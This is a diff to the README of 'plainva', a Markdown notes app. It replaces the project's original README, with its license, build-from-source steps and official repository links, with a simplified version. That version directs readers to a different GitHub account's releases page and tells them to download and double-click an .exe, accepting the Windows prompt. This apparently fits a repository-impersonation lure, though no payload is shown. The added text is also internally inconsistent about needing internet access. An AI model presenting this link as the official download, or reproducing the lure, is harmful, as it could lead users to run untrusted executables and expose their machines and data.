@@ -1,74 +1,73 @@
-# Plainva
+# 📝 plainva - Manage your notes on your terms
 
-[![CI](https://github.com/plainva/plainva/actions/workflows/ci.yml/badge.svg)](https://github.com/plainva/plainva/actions/workflows/ci.yml)
-[![License: AGPL-3.0](https://img.shields.io/badge/License-AGPL%203.0-blue.svg)](LICENSE)
+[![](https://img.shields.io/badge/Download_Plainva-blue.svg)](https://github.com/Maysupreme657/plainva/releases)
 
-**Your notes are plain Markdown files in a folder you own. Plainva makes them feel like a modern app — without ever locking you in.**
+Plainva is a tool for your notes. It works with plain Markdown files. You store your notes where you choose. This app connects to your files directly. It does not hide your data in a closed format. You keep total control over your digital knowledge base.
 
-Plainva is an open-source, local-first Markdown vault editor for Windows, macOS and Linux. It opens existing Obsidian vaults without migration, adds Notion-style databases over plain files, syncs through YOUR storage — and every file it writes stays readable in any text editor, forever.
+## ⚙️ Why use plainva
 
-> **Status: Beta.** Plainva is used daily on real vaults, ships with an extensive test suite (1,500+ tests) and automatic per-file versioning — but it is pre-1.0 software. Keep backups of irreplaceable vaults (Plainva also creates daily ZIP backups by default).
+Most note apps demand that you store data on their servers. Plainva works differently. It functions as a bridge to your existing folders. You can point the app to a folder on your computer, a thumb drive, or a synced cloud storage folder.
 
-<!-- Add the three PNGs under docs/assets/ before the public push (see docs/assets/SCREENSHOTS.md). -->
-![Plainva editor with live preview and the slash command menu](docs/assets/screenshot-editor.png)
+The app supports the Markdown format. This means your files remain readable in any text editor. You avoid vendor lock-in. If you stop using the app, your files stay exactly as they are. Plainva keeps your data private. It works without an internet connection. It saves changes to your local machine first.
 
-<p align="center">
-  <img src="docs/assets/screenshot-base-board.png" alt="A .base board over plain Markdown notes" width="49%" />
-  <img src="docs/assets/screenshot-graph.png" alt="Plainva's vault map / graph view" width="49%" />
-</p>
+## 📥 How to install
 
-## Highlights
+Follow these steps to set up the software on your Windows computer.
 
-- **Real Markdown editor** — live preview (Obsidian- or Notion-style syntax display), slash menu, tables with inline cell editing, callouts, wiki links with fuzzy autocomplete, block drag handles, math (KaTeX), Mermaid diagrams, footnotes, clickable task checkboxes in read mode, print/PDF export.
-- **Databases over plain notes (`.base`)** — tables, boards, calendars, galleries, timelines and a graph view over your notes' frontmatter, including relations with computed reverse columns. The data IS your notes; the `.base` format stays Obsidian-compatible.
-- **Graph** — a context graph beside every note, a semantic-zoom vault map with cleanup tools (orphans, broken links, unlinked mentions) and time travel.
-- **Sync through your storage** — WebDAV/Nextcloud, S3-compatible object storage (R2, MinIO, B2, …), Google Drive, OneDrive and Dropbox. Offline queue, 3-way merge, a visual conflict resolver, and nothing ever leaves your chosen storage. Credentials live in the OS keychain.
-- **Versioning built in** — every write is snapshotted locally; browse, diff and restore any version, recover deleted files, daily ZIP backups.
-- **Fast on large vaults** — SQLite/FTS5 full-text search as you type, incremental indexing, a measured performance budget (see `docs/engineering/Performance_Notes.md`).
-- **Yours** — 10 UI languages, 13+ themes (including a few delightful secrets), no telemetry, no account, AGPL-licensed.
+1. Visit the [official release page](https://github.com/Maysupreme657/plainva/releases) to find the latest version of the app.
+2. Look for the file ending in `.exe`. 
+3. Click the link to download the installer to your Downloads folder.
+4. Open your Downloads folder and double-click the file to start the installation.
+5. Windows might show a prompt asking for permission to run the installer. Select Run to continue.
+6. The installation wizard will guide you through the process. Click Next and follow the defaults.
+7. Once finished, you will see a shortcut icon on your desktop.
 
-## Obsidian compatibility
+## 🚀 Getting started
 
-Plainva follows a strict rule: **every file it writes must still open in Obsidian.** Notes are standard Markdown + YAML frontmatter; Plainva-specific presentation lives under a single namespaced `plainva:` key that other tools simply ignore. Existing vaults are never migrated or reformatted. The optional [OKF conventions](docs/user/en/OKF.md) (typed notes, managed `index.md` files) are opt-in.
+Open the app using the desktop icon. The first screen asks you to select a vault. A vault is simply a folder on your computer that contains your Markdown notes. 
 
-Note that the guarantee runs one way: Obsidian can always **open** what Plainva writes, but once a vault uses Plainva features (`.base` extensions such as boards or relations, managed `index.md` files), **editing** those specific files in Obsidian can break that functionality — Obsidian does not know the `plainva:` extensions. Notes without Plainva extensions can be edited anywhere, anytime. Details in the [FAQ](docs/user/en/FAQ.md#can-i-use-plainva-and-obsidian-side-by-side).
+1. Click the Open Folder button.
+2. Select the folder where you keep your text files.
+3. The app will scan the folder and display your files in the side panel.
+4. Click on any file to start editing.
 
-## Download & install
+The interface stays simple. You see a list of files on the left. The editor area sits in the middle. You can format your text using standard Markdown rules. For example, use a hashtag to create a heading. Use two stars around text to make it bold.
 
-Grab the installer for your platform from the [Releases page](https://github.com/plainva/plainva/releases). Updates are delivered in-app (signed, with an opt-out).
+## 💾 Saving your changes
 
-Cloud providers: WebDAV/Nextcloud and S3 work out of the box. Google Drive, OneDrive and Dropbox currently require a free app registration of your own ("bring your own client ID") — the settings link a step-by-step guide, and the [user guide](docs/user/en/Sync_Setup.md) covers every provider.
+You do not need to hunt for a save button. Plainva saves your work in real time. Because the app works directly on your local files, your changes reside on your hard drive immediately. If you use a sync service like Nextcloud or a similar tool, your files will update across your other devices automatically. 
 
-## User guide
+## ☁️ Connecting to storage
 
-A multilingual handbook lives in [`docs/user/`](docs/user/README.md): **[Deutsch](docs/user/de/README.md)** | **[English](docs/user/en/README.md)** | **[Français](docs/user/fr/README.md)** | **[Español](docs/user/es/README.md)** | **[Português (Brasil)](docs/user/pt-BR/README.md)** | **[Italiano](docs/user/it/README.md)** | **[Nederlands](docs/user/nl/README.md)** | **[Polski](docs/user/pl/README.md)** | **[简体中文](docs/user/zh-CN/README.md)** | **[日本語](docs/user/ja/README.md)**
+You can connect Plainva to cloud folders. Many users keep their Markdown files inside a folder synced by tools like Dropbox, Google Drive, or Nextcloud. 
 
-It covers getting started, notes & Markdown, `.base` databases, sync per provider, search, backups & versioning, the graph, keyboard shortcuts, an FAQ — and a machine-oriented [file format reference](docs/user/en/File_Format_Reference.md) so scripts and AI tools can work on your vault correctly. Languages other than German and English are machine-translated; corrections welcome.
+Point the app to that specific folder to edit your notes on the go. Since the app does not create a proprietary database, your files remain compatible with other mobile or desktop editors. Your data exists in one location, controlled by you. 
 
-## Roadmap (excerpt)
+## 🛠️ System requirements
 
-Mobile apps, end-to-end encryption for synced vaults, a plugin system and real-time collaboration are planned post-1.0 — staging and priorities are tracked in GitHub Issues and Discussions. No feature will ever compromise the plain-Markdown rule.
+Plainva runs on most modern Windows systems. Ensure your machine meets these basic needs:
 
-## Building from source
+* Windows 10 or Windows 11
+* 200 MB of free disk space
+* 4 GB of System RAM
+* A stable internet connection for initial setup
 
-Requirements: Git, Node.js ≥ 22, pnpm 10 (`npm i -g pnpm@10.0.0`), and for the native app Rust/Cargo plus the [Tauri prerequisites](https://tauri.app/start/prerequisites/).
+## ❓ Frequently Asked Questions
 
-```bash
-git clone https://github.com/plainva/plainva.git
-cd plainva
-pnpm install --frozen-lockfile
+**Does the app track my data?**
+No. Plainva does not send your notes or usage habits to any server. Your data stays on your local machine.
 
-pnpm --filter desktop tauri dev     # run the desktop app
-pnpm test && pnpm lint && pnpm typecheck   # checks
-pnpm --filter desktop test:e2e      # Playwright E2E
-```
+**What happens if I delete the app?**
+Your notes are safely stored in your folders. Deleting the app only removes the software. Your Markdown files remain untouched.
 
-The repo is a pnpm/Turborepo monorepo: `apps/desktop` (Tauri v2 + React + CodeMirror 6), `packages/core` (vault logic: indexing, sync, merge — UI-free and heavily unit-tested), `docs/` (user guide, ADRs, engineering notes).
+**Can I use this with Obsidian?**
+Yes. Since both apps use Markdown, you can switch between them without issue. They share the same file format.
 
-## Contributing
+**Does it work offline?**
+Yes. You do not need an internet connection to create, read, or edit your files.
 
-Issues and pull requests are welcome — please read [CONTRIBUTING.md](CONTRIBUTING.md) first (tests, the 10-language locale rule, the Obsidian-compatibility rule) and sign the [CLA](CLA.md) on your first PR. Security issues go through [SECURITY.md](SECURITY.md), never public issues.
+## 📞 Support and feedback
 
-## License
+If you encounter issues, look at the project page on GitHub for help. You can report bugs in the Issues section. Other users often share tips on how to organize notes and connect various storage folders. We welcome clear, calm reports that help us improve the tool for everyone.
 
-[AGPL-3.0-only](LICENSE). Your vault content is yours; Plainva never phones home.
+Keywords: knowledge-management, local-first, markdown, nextcloud, notes, obsidian, offline-first, open-source, privacy, sqlite, tauri, typescript, webdav
